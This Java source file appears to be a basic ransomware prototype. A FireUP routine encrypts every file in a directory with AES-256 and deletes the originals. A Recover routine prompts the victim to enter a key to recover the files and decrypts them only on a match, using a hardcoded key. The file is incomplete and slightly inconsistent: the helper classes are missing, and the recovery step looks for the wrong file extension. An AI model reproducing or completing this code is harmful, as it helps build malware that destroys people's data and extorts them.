import java.io.File;
import java.io.FileFilter;
import java.io.FilenameFilter;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.Locale;
import java.util.Scanner;

public class main {

    public static String CodeKey = "CodeKey";
    //Project Path
    public static String currentWorkingDir = System.getProperty("user.dir");
    public static String basedir = currentWorkingDir + "\\data\\";

    public static void main(String[] args) {

        Decrypt(basedir + "test.txt", CodeKey);

    }

    public static void FireUP(String path){
        File file = new File(path);
        File[] files = file.listFiles();

        for(File f:files){
            System.out.println(f.getName());
            System.out.println();
            Encrypt(path + f.getName(), CodeKey);
        }
    }


    public static void Encrypt(String targetFilePath, String CodeKey){

        File inputFile = new File(targetFilePath);
        File encryptedFile = new File(targetFilePath + ".encrypted");

        try{
            AES256.encrypt(CodeKey, inputFile, encryptedFile);
            System.out.println(inputFile + "is encrypted now...");
            inputFile.delete();

        } catch (CryptoException | NoSuchAlgorithmException | InvalidKeySpecException e){
            System.out.println(e.getMessage());
            e.printStackTrace();
        }

    }


    public static void Decrypt(String targetFilePath, String CodeKey){
        File inputFile = new File(targetFilePath);
        File decryptedFile = new File(targetFilePath + ".decrypted");

        try{
            AES256.decrypt(CodeKey, inputFile, decryptedFile);
            System.out.println(inputFile + "is decrypted now...");

        } catch (CryptoException e){
            System.out.println(e.getMessage());
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (InvalidKeySpecException e) {
            e.printStackTrace();
        }
    }



    public static void Recover(String CodeKey, String directoryPath){
        Scanner myObj = new Scanner(System.in);
        System.out.println("Enter the Key to recover your files: ");

        String code = myObj.nextLine();
        System.out.println("Entered Key is: " + code);


        if (code.equals(CodeKey)){
            System.out.println("Okay....");
            File file = new File(directoryPath);
            FileFilter filter;
            File[] files = file.listFiles(new FilenameFilter() {
                @Override
                public boolean accept(File dir, String name) {
                    if(name.toLowerCase().endsWith(".encrypt")){
                        return true;
                    }else{
                        return false;
                    }
                }
            });

            for (File f: files){
                System.out.println(f.getName());
                Decrypt(directoryPath + f.getName(), CodeKey);
            }


        }else {
            System.out.println("Its Wrong ... ");
        }

    }





}
